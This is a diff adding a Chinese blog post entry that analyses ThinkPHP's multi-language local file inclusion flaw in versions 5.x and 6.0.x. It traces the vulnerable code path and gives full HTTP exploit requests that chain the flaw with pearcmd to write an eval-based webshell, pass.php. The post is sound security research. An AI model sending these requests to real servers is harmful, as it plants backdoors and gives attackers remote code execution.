@@ -419,4 +419,73 @@
         <tag>php</tag>
       </tags>
   </entry>
+  <entry>
+    <title>thinkphp多语言本地文件包含漏洞</title>
+    <url>/2024/01/29/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="漏洞介绍">漏洞介绍:</h2>
+<p><code>ThinkPHP</code> 在开启多语言的情况下，存在文件包含漏洞，配合 <code>pearcmd</code> 可以 <code>getshell</code>。</p>
+<h2 id="漏洞影响">漏洞影响:</h2>
+<p>存在漏洞的版本</p>
+<p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
+<p>不存在漏洞的版本</p>
+<p>ThinkPHP &gt;= 6.0.14<br>
+ThinkPHP &gt;= 5.1.42</p>
+<h2 id="漏洞分析1-thinkphp5版本">漏洞分析1:thinkphp5版本</h2>
+<h4 id="测试环境搭建">测试环境搭建:</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp v5.1.41</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
+<p>首先在文件tp5.1/config/app.php中开启多语言</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216766.png" alt="image-20240129205913722"></p>
+<p>然后在tp5.1/public目录新建文件phpinfo.php内容为&lt;?=phpinfo();</p>
+<h4 id="漏洞分析">漏洞分析:</h4>
+<p>漏洞验证时当我们访问如下url时会文件包含phpinfo.php</p>
+<p>url:<a href="http://localhost/tp5.1/public/index.php/?lang=../../public/phpinfo">http://localhost/tp5.1/public/index.php/?lang=../../public/phpinfo</a></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216768.png" alt="image-20240129210258464"></p>
+<p>我们来分析漏洞成因</p>
+<p>首先我们看到tp5.1\thinkphp\library\think\App.php中的loadLangPack方法</p>
+<p>文件包含点出现在Lang::load方法中,想要包含任意php文件,我们需要控制变量langset的值</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216769.png" alt="image-20240129211951600"></p>
+<p>先分析Lang::detect中</p>
+<p>我们可以通过get请求带有参数lang的方式给$this-&gt;range赋任意值</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216770.png" alt="image-20240129212459276"></p>
+<p>接着回到loadLangPack方法,因为<code>$this-&gt;request-&gt;setLangset($this-&gt;lang-&gt;range());</code>所以通过Lang类的变量range我们可以给Lang类的变量Langset赋予任意值。</p>
+<p>再来看Lang::load</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216771.png" alt="image-20240129213137201"></p>
+<p>包含的文件一般是这个样子的,而且我们只能包含php文件。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216772.png" alt="image-20240129213225196"></p>
+<p>所以这个漏洞需要和pearcmd拓展相结合才能rce</p>
+<p>pearcmd利用方式介绍:<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
+<p>所以最终的利用数据包应该是这样的形式(将会在public目录生成后门文件pass.php)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /tp5.1/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;pass&#x27;])?&gt;+pass.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析2-thinkphp6版本">漏洞分析2:thinkphp6版本</h2>
+<h4 id="测试环境搭建-2">测试环境搭建:</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp v6.0.13</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
+<p>首先在文件tp6.0/app/middleware.php中开启多语言</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216773.png" alt="image-20240129214050772"></p>
+<p>然后在tp6.0/public目录新建文件phpinfo.php内容为&lt;?=phpinfo();</p>
+<h4 id="漏洞分析-2">漏洞分析:</h4>
+<p>漏洞验证时当我们访问如下url时会文件包含phpinfo.php</p>
+<p>url:<a href="http://localhost/tp6.0/public/index.php/?lang=../../public/phpinfo">http://localhost/tp6.0/public/index.php/?lang=../../public/phpinfo</a></p>
+<p>首先看到tp6.0\vendor\topthink\framework\src\think\middleware\LoadLangPack.php中的handle方法</p>
+<p>detect方法和和thinkphp5的没有太大差别同样是可以通过get传递lang的方式设置$langset的值,load</p>
+<p>方法在switchLangSet()我们需要进入其中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216774.png" alt="image-20240129220407703"></p>
+<p>进入Lang::switchLangSet</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216775.png" alt="image-20240129220805164"></p>
+<p>继续进入其中的load方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216776.png" alt="image-20240129220853353"></p>
+<p>继续进入其中的parse方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216777.png" alt="image-20240129220939851"></p>
+<p>包含的文件一般是这个样子的,还是只能包含php文件。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216778.png" alt="image-20240129221419977"></p>
+<p>和pearcmd结合利用的数据包如下:(将会在public目录生成后门文件pass.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /tp6.0/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;pass&#x27;])?&gt;+pass.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>thinkphp框架漏洞</category>
+      </categories>
+      <tags>
+        <tag>thinkphp漏洞</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
 </search>
